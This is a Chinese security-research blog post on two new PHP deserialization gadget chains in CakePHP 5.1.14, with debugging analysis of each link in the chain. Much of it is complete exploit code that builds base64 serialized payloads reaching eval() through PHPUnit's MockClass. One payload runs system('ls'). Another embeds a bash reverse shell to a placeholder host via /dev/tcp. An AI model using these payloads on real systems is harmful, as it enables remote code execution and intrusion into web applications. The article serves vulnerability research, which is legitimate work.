# CakePHP 5.1.14最新版本 挖掘两条gadget链子-先知社区

> **来源**: https://xz.aliyun.com/news/16639  
> **文章ID**: 16639

---

# CakePHP 5.1.14最新版本 反序列化POP链挖掘

以往的旧版本pop链gadget已经被官方修复，本文研究挖掘一条CakePHP 5.1.14最新版本的gadget链子，详细做了调试分析，并有两个不同的gadget链

### Cakephp 5.1.14新入口和RCE终点的探索

对于之前3.x 4.x中的入口点`vendor\symfony\process\Process.php`，新的版本加了个\_\_wakeup方法限制 直接抛出异常了![](images/2aec6d95-b252-34b4-acbc-327a3ec754af)

#### 寻找destruct入口

通过全局搜索我们发现类`Internal/RejectedPromise.php`中有`destruct`入口

源码如下

```
public function __destruct()  
{  
    if ($this->handled) {  
        return;  
    }  
  
    $handler = set_rejection_handler(null);  
    if ($handler === null) {  
        $message = 'Unhandled promise rejection with ' . $this->reason;  
  
        \error_log($message);  
        return;  
    }  
  
    try {  
        $handler($this->reason);  
    } catch (\Throwable $e) {  
        \preg_match('/^([^:\s]++)(.*+)$/sm', (string) $e, $match);  
        \assert(isset($match[1], $match[2]));  
        $message = 'Fatal error: Uncaught ' . $match[1] . ' from unhandled promise rejection handler' . $match[2];  
  
        \error_log($message);  
        exit(255);  
    }  
}
```

发现有触发toString魔术方法的地方，我们跟进`set_rejection_handler`，由于源码中传入的为null返回也是null，并且`$this->reason`可控那么我们便可以利用这个入口点![](images/7e380e4a-4734-3126-b9e7-66c4559d3398)并且`private $handled`默认为`false;`不需要管

#### 寻找toString方法

全局找 `__tostring` 魔术方法，发现两处可以触发 `__call()` 魔术方法, ，且变量 `$constExpr` 可控`\Ast\Type\ConstTypeNode` 类源码：

```
public function __toString(): string  
{  
    return $this->constExpr->__toString();  
}
```

#### 寻找\_\_call方法

 全局搜索\_\_call方法 挨个看 然后就找到位于:`vendor\cakephp\cakephp\src\ORM\Table.php`![](images/d81e4dde-b3bb-32d1-8a83-efeee28db44f)`_behaviors`属性可控，我们只要让它拥有method方法就可以调用call方法

#### 寻找call方法调用

全局搜索call函数 找到`vendor\cakephp\cakephp\src\ORM\BehaviorRegistry.php`

审计代码可以发现可以动态调用类的方法

```
public function call(string $method, array $args = []): mixed  
{  
    $method = strtolower($method);  
    if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {  
        [$behavior, $callMethod] = $this->_methodMap[$method];  
  
        return $this->_loaded[$behavior]->{$callMethod}(...$args);  
    }  
  
    throw new BadMethodCallException(  
        sprintf('Cannot call `%s`, it does not belong to any attached behavior.', $method),  
    );  
}
```

* `if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {`
* `$this->hasMethod($method)` 检查当前类或其扩展功能是否定义了名为 `$method` 的方法。
* `$this->has($this->_methodMap[$method][0])` 检查 `$this->_methodMap` 中与 `$method` 关联的行为（behavior）是否存在。
* `$this->_methodMap` 是一个数组，存储了方法名到行为和具体调用方法的映射关系。
* `[$behavior, $callMethod] = $this->_methodMap[$method];`
* 将 `$this->_methodMap[$method]` 的值（通常是一个数组）解构为 `$behavior` 和 `$callMethod`。
* `$behavior` 表示行为的标识名称。
* `$callMethod` 是行为中对应的方法名
* `return $this->_loaded[$behavior]->{$callMethod}(...$args);`
* 从 `$this->_loaded` 数组中找到与 `$behavior` 对应的已加载对象。
* 动态调用 `$callMethod` 方法，并将 `$args` 解包作为参数传入方法。
* `{$callMethod}` 是一种动态方法名调用的方式，PHP 支持通过变量来调用对象的方法。

第一个条件仍然是可以控制`_methodMap`来控制返回值![](images/81e2b5cf-285f-3df3-ac64-66486a40f7a4)

第二个条件是父类`ObjectRegistry`的`has`方法 `_loaded`属性同样也是可控的![](images/3d1417db-5df3-32f2-a21f-d70b67bfd0aa)

#### 寻找RCE终点

通过上面的链子，可以发现call调用的动态函数是无参数的，也就是我们要找一个**类的方法不需要参数或者参数默认**完成RCE

注意：

* 无参函数可以有参调用
* 当php version ≥ 7.1.0，有参函数不能无参调用，会直接报Fatal error
* 当php version ≤ 7.0.33，有参函数可以无参调用，但会有个警告（Warning: Missing argument）

旧版链子中`vendor\cakephp\cakephp\src\Database\Statement\CallbackStatement.php`已经被移除了我们seay寻找到`src\Framework\MockObject\Generator\MockClass`类中的 `generate` 方法

`mockName`需要放一个存在的类名即可进入if，属性`classCode`可控里面可以用php代码RCE

```
public function generate(): string  
{  
    if (!class_exists($this->mockName, false)) {  
        eval($this->classCode);  
  
        call_user_func(  
            [  
                $this->mockName,  
                '__phpunit_initConfigurableMethods',  
            ],  
            ...$this->configurableMethods,  
        );  
    }
```

**pop链**：

```
RejectedPromise::__destruct()->Response::__toString()->Table::__call()->BehaviorRegistry::call()->MockClass::->generate()
```

构造exp

```
<?php  
#RCE  
namespace PHPUnit\Framework\MockObject\Generator;  
interface MockType{}  
final class MockClass implements MockType{  
    private  $classCode;  
    private   $mockName;  
    public function  __construct()  {  
$this->classCode = "system('ls');";  
$this->mockName = "MockClass";  
    }  
  
}  
  
# call  
namespace Cake\Core;  
  
use Countable;  
use IteratorAggregate;  
use PHPUnit\Framework\MockObject\Generator\MockClass;  
  
abstract class ObjectRegistry implements Countable, IteratorAggregate  
{  
    protected  $_loaded = [];  
    public function __construct()  
    {  
        $this->_loaded['MockClass']=new MockClass();  
    }  
}  
  
  
namespace Cake\Event;  
interface EventDispatcherInterface{}  
# __call  
namespace Cake\Datasource;  
interface RepositoryInterface{}  
namespace Cake\Event;  
interface EventListenerInterface{}  
namespace Cake\Validation;  
interface ValidatorAwareInterface{}  
  
namespace Cake\ORM;  
  
use Cake\Datasource\RepositoryInterface;  
use Cake\Event\EventListenerInterface;  
use Cake\Validation\ValidatorAwareInterface;  
use Cake\Core\ObjectRegistry;  
use Cake\Event\EventDispatcherInterface;  
use Traversable;  
class Table implements RepositoryInterface, EventListenerInterface, EventDispatcherInterface, ValidatorAwareInterface  
{  
    protected  $_behaviors;  
    public function  __construct()  {  
        $this->_behaviors= new BehaviorRegistry();  
  
    }  
}  
  
class BehaviorRegistry extends ObjectRegistry implements EventDispatcherInterface{  
    public function count(): int {  
    }  
    public function getIterator(): Traversable  
    {  
  
    }  
    protected  $_methodMap = ['__tostring'=>['MockClass',"generate"]];  
}  
#tostring  
namespace PHPStan\PhpDocParser\Ast;  
  
interface Node{}  
namespace PHPStan\PhpDocParser\Ast\Type;  
use PHPStan\PhpDocParser\Ast\Node;  
  
interface TypeNode extends Node{}  
  
namespace PHPStan\PhpDocParser\Ast\Type;  
use Cake\ORM\Table;  
use PHPStan\PhpDocParser\Ast\NodeAttributes;  
class ConstTypeNode implements TypeNode  
{  
    public $constExpr;  
    public function __construct()  
    {  
        $this->constExpr =new Table();  
    }  
  
}  
  
  
#destruct  
namespace React\Promise;  
interface PromiseInterface{}  
namespace React\Promise\Internal;  
  
use PHPStan\PhpDocParser\Ast\Type\ConstTypeNode;  
use React\Promise\PromiseInterface;  
  
final class RejectedPromise implements PromiseInterface  
{  
    private $reason;  
    public function __construct(){  
        $this->reason= new ConstTypeNode();  
    }  
}  
  
echo base64_encode(serialize(new RejectedPromise()));
```

注意：

* 在 PHP 中，当你使用 `implements` 时，PHP 会尝试找到并加载 `MockType` 接口。
* 如果 `MockType` 接口未定义，或者没有在当前命名空间中找到，PHP 会报错。

成功rce![](images/b0713722-9845-32d1-84fb-7f6b4b6232bf)

#### 第二种tostring点

通过寻找发现`src/cakephp-5-1-4/vendor/cakephp/cakephp/src/Http/Response.php`也可以触发\_\_call方法![](images/23688e03-3019-3964-b4d0-3257399ba746)

以这个gadget来写pop链的话poc为

```
namespace React\Promise\Internal{
    ini_set('display_errors',1);

    use Cake\Http\Response;
    class RejectedPromise{
        private $reason;
        public function __construct(){
            $this->reason = new Response();
        }
    }
    echo urlencode(base64_encode(serialize(new RejectedPromise())));
}

namespace Cake\Http{

    use Cake\ORM\Table;

    class Response{
        private $stream;
        public function __construct(){
            $this->stream = new Table();
        }
    }
}
namespace Cake\ORM
{
    use PHPUnit\Framework\MockObject\Generator\MockClass;

    class Table
    {
        protected $_behaviors;

        public function __construct()
        {
            $this->_behaviors = new BehaviorRegistry();
        }
    }

    class BehaviorRegistry
    {
        protected $_methodMap;
        protected $_loaded;

        public function __construct()
        {
            $this->_methodMap = ['rewind' => ['mb', 'generate']];
            $this->_loaded = ['mb' => new MockClass()];
        }
    }

}
namespace PHPUnit\Framework\MockObject\Generator{
    class MockClass{
        private $classCode;
        private $mockName;
        public function __construct(){
            $this->classCode = "system("bash -c 'bash -i >& /dev/tcp/xx.xx.xx.xx/xxxx 0>&1'");";
            $this->mockName = "test";
        }
    }
}
```
